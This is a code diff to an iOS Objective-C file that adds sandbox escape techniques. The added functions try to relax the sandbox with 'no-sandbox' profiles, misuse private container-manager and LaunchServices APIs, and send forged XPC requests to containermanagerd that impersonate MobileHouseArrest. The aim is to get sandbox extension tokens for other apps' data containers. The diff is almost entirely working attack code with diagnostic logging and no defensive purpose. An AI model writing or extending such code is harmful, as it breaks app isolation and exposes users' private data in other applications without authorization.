@@ -488,6 +488,200 @@ static int64_t _worseQueryGrant(const char *targetPath, const char *leaseLabel) 
     return -1;
 }
 
+#pragma mark - Aggressive sandbox techniques
+
+static void _attemptSandboxRelax(void) {
+    typedef int (*SandboxInitFunc)(const char *, uint64_t, char **);
+    typedef int (*SandboxInitParamsFunc)(const char *, uint64_t, const char *const [], char **);
+    typedef void (*SandboxFreeErrorFunc)(char *);
+
+    SandboxInitFunc si = (SandboxInitFunc)dlsym(RTLD_DEFAULT, "sandbox_init");
+    SandboxFreeErrorFunc sfe = (SandboxFreeErrorFunc)dlsym(RTLD_DEFAULT, "sandbox_free_error");
+
+    if (si) {
+        static const char *kProfiles[] = {
+            "no-sandbox", "no-network", "no-internet",
+            "com.apple.MobileHouseArrest",
+            "com.apple.mobile.MobileHouseArrest",
+            "MobileHouseArrest",
+            "com.apple.afc",
+        };
+        for (int i = 0; i < (int)(sizeof(kProfiles)/sizeof(kProfiles[0])); i++) {
+            char *err = NULL;
+            int rc = si(kProfiles[i], 0, &err);
+            NSLog(@"[FD-SBX] sandbox_init(%s) -> %d err=%s", kProfiles[i], rc, err ?: "none");
+            if (err) { if (sfe) sfe(err); else free(err); }
+            if (rc == 0) {
+                NSLog(@"[FD-SBX] SANDBOX RELAXED via %s!", kProfiles[i]);
+                return;
+            }
+        }
+    }
+
+    SandboxInitParamsFunc sip = (SandboxInitParamsFunc)dlsym(RTLD_DEFAULT,
+                                                              "sandbox_init_with_parameters");
+    if (sip) {
+        const char *params[] = { "HOME", "/private/var/mobile", NULL };
+        char *err = NULL;
+        int rc = sip("no-sandbox", 0, params, &err);
+        NSLog(@"[FD-SBX] sandbox_init_with_parameters -> %d", rc);
+        if (err) { if (sfe) sfe(err); else free(err); }
+    }
+}
+
+static int64_t _tryContainerCreateLookup(const char *targetPath) {
+    typedef const char *(*ContainerLookup_t)(uint64_t, const char *, void **, char **);
+    ContainerLookup_t lookup = (ContainerLookup_t)dlsym(RTLD_DEFAULT,
+        "container_create_or_lookup_path_for_current_user");
+    if (!lookup) return -1;
+
+    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
+                                                             "sandbox_extension_consume");
+    MCMObjectCopyToken_t copyToken = (MCMObjectCopyToken_t)dlsym(RTLD_DEFAULT,
+                                                                   "container_copy_sandbox_token");
+
+    static const uint64_t kClasses[] = { 2, 7, 10, 12, 13, 15 };
+    static const char *kClassLabels[] = { "app", "grp", "intd", "sys", "sgrp", "psys" };
+    for (int ci = 0; ci < 6; ci++) {
+        void *container = NULL;
+        char *errMsg = NULL;
+        const char *result = lookup(kClasses[ci], targetPath, &container, &errMsg);
+        if (errMsg) { free(errMsg); errMsg = NULL; }
+        if (!result) continue;
+
+        NSLog(@"[FD-CL] create_lookup cls=%s path=%s -> %s",
+              kClassLabels[ci], targetPath, result);
+
+        if (container && copyToken && consumeExt) {
+            char *token = copyToken(container);
+            if (token && token[0]) {
+                int64_t h = consumeExt(token);
+                if (h >= 0) {
+                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+                    if (fd >= 0) {
+                        close(fd);
+                        free(token);
+                        NSLog(@"[FD-CL] create_lookup ACCESS cls=%s h=%lld",
+                              kClassLabels[ci], (long long)h);
+                        return h;
+                    }
+                }
+            }
+            free(token);
+        }
+    }
+    return -1;
+}
+
+static int64_t _tryLSProxyGrant(const char *targetPath) {
+    Class LSAppProxy = NSClassFromString(@"LSApplicationProxy");
+    Class LSAppWorkspace = NSClassFromString(@"LSApplicationWorkspace");
+    if (!LSAppProxy || !LSAppWorkspace) return -1;
+
+    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
+                                                             "sandbox_extension_consume");
+
+    id workspace = [LSAppWorkspace performSelector:@selector(defaultWorkspace)];
+    if (!workspace) return -1;
+
+    NSArray *allApps = nil;
+    @try {
+        allApps = [workspace performSelector:@selector(allInstalledApplications)];
+    } @catch (NSException *e) {
+        NSLog(@"[FD-LS] allInstalledApplications exception: %@", e);
+        return -1;
+    }
+
+    NSString *target = [NSString stringWithUTF8String:targetPath];
+
+    for (id proxy in allApps) {
+        @autoreleasepool {
+            NSURL *dataURL = nil;
+            @try {
+                if ([proxy respondsToSelector:@selector(dataContainerURL)])
+                    dataURL = [proxy performSelector:@selector(dataContainerURL)];
+            } @catch (NSException *e) { continue; }
+            if (!dataURL) continue;
+
+            NSString *containerPath = dataURL.path;
+            if (!containerPath) continue;
+
+            if ([containerPath hasPrefix:@"/var/"])
+                containerPath = [@"/private" stringByAppendingString:containerPath];
+
+            if ([target hasPrefix:containerPath] || [target isEqualToString:containerPath]) {
+                BOOL started = [dataURL startAccessingSecurityScopedResource];
+                NSLog(@"[FD-LS] security-scoped start=%d for %@", started, containerPath);
+
+                if (started) {
+                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+                    if (fd >= 0) {
+                        close(fd);
+                        return 9500;
+                    }
+                }
+
+                NSURL *targetURL = [NSURL fileURLWithPath:target];
+                started = [targetURL startAccessingSecurityScopedResource];
+                if (started) {
+                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+                    if (fd >= 0) {
+                        close(fd);
+                        return 9501;
+                    }
+                }
+            }
+        }
+    }
+    return -1;
+}
+
+static int64_t _tryDirectContainerdXPC(const char *targetPath) {
+    xpc_connection_t conn = xpc_connection_create_mach_service(
+        "com.apple.containermanagerd", NULL, 0);
+    if (!conn) return -1;
+
+    xpc_connection_set_event_handler(conn, ^(xpc_object_t __unused event) {});
+    xpc_connection_resume(conn);
+
+    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
+                                                             "sandbox_extension_consume");
+    int64_t result = -1;
+
+    static const uint64_t kOps[] = { 6, 7, 8, 10, 12 };
+    for (int oi = 0; oi < 5 && result < 0; oi++) {
+        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(msg, "path", targetPath);
+        xpc_dictionary_set_uint64(msg, "operation", kOps[oi]);
+        xpc_dictionary_set_uint64(msg, "class", 2);
+        xpc_dictionary_set_bool(msg, "create", true);
+        xpc_dictionary_set_bool(msg, "activate", true);
+        xpc_dictionary_set_string(msg, "bundle-id", "com.apple.mobile.MobileHouseArrest");
+
+        xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);
+        if (reply && xpc_get_type(reply) == XPC_TYPE_DICTIONARY) {
+            const char *token = xpc_dictionary_get_string(reply, "sandbox-extension");
+            if (!token) token = xpc_dictionary_get_string(reply, "token");
+            if (!token) token = xpc_dictionary_get_string(reply, "extension");
+            if (token && consumeExt) {
+                int64_t h = consumeExt(token);
+                if (h >= 0) {
+                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+                    if (fd >= 0) {
+                        close(fd);
+                        result = h;
+                        NSLog(@"[FD-XPC] Direct XPC op=%llu OK h=%lld",
+                              kOps[oi], (long long)h);
+                    }
+                }
+            }
+        }
+    }
+
+    xpc_connection_cancel(conn);
+    return result;
+}
+
 #pragma mark - FDGrantAccess
 
 typedef char *(*SandboxIssueFileFunc)(const char *, const char *, uint32_t);
@@ -555,6 +749,12 @@ int64_t FDGrantAccess(const char *path) {
             "com.apple.app-sandbox.read",
             "com.apple.sandbox.container",
             "com.apple.security.exception.files.absolute-path.read-write",
+            "com.apple.mobile.house_arrest.readwrite",
+            "com.apple.mobile.house_arrest.readonly",
+            "com.apple.mobile.house_arrest",
+            "com.apple.sandbox.system-group",
+            "com.apple.security.exception.files.absolute-path.read-only",
+            "com.apple.app-sandbox.read-write.file-mode.metadata-only",
         };
         int nClasses = sizeof(kExtClasses) / sizeof(kExtClasses[0]);
 
@@ -760,6 +960,36 @@ int64_t FDGrantAccess(const char *path) {
             }
             _diagAppend("MCM-C2-TOK fail | ");
         }
+    }
+
+    // Strategy 10: Direct XPC to containermanagerd (bypass MCM wrapper)
+    {
+        int64_t xpcH = _tryDirectContainerdXPC(pathC);
+        if (xpcH >= 0) {
+            _diagAppend("XPC-DIRECT OK h=%lld", (long long)xpcH);
+            return 9300;
+        }
+        _diagAppend("XPC-DIRECT fail | ");
+    }
+
+    // Strategy 11: LSApplicationProxy dataContainerURL + security-scoped resource
+    {
+        int64_t lsH = _tryLSProxyGrant(pathC);
+        if (lsH >= 0) {
+            _diagAppend("LS-PROXY OK h=%lld", (long long)lsH);
+            return (int)lsH;
+        }
+        _diagAppend("LS-PROXY fail | ");
+    }
+
+    // Strategy 12: container_create_or_lookup_path_for_current_user
+    {
+        int64_t clH = _tryContainerCreateLookup(pathC);
+        if (clH >= 0) {
+            _diagAppend("C-LOOKUP OK h=%lld", (long long)clH);
+            return 9400;
+        }
+        _diagAppend("C-LOOKUP fail | ");
     }
 
     _diagAppend("ALL FAILED");
@@ -1517,6 +1747,9 @@ NSString *FDDiscoverContainerPath(NSString *bundleID) {
 int FDContainerEngineInit(void) {
     FDLog(@"Initializing container engine...");
     _diagReset();
+
+    // Phase 0: Attempt sandbox profile relaxation (best effort)
+    _attemptSandboxRelax();
 
     static const char *kEscapePaths[] = {
         "/private/var/mobile/Containers/Data/Application",
